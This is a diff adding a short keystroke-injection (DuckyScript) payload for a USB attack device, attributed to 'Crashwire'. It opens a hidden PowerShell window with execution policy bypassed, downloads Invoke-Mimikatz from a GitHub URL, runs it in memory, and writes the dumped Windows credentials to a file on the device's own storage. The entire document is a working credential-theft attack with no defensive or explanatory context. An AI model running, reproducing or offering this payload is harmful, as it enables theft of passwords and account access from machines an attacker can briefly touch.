@@ -1,0 +1,8 @@
+REM Author Crashwire
+REM Description: Download and run's mimikatz
+ATTACKMODE HID STORAGE
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz | Out-File -FilePath D:\mimikatz_creds.txt -Encoding ASCII"
+ENTER
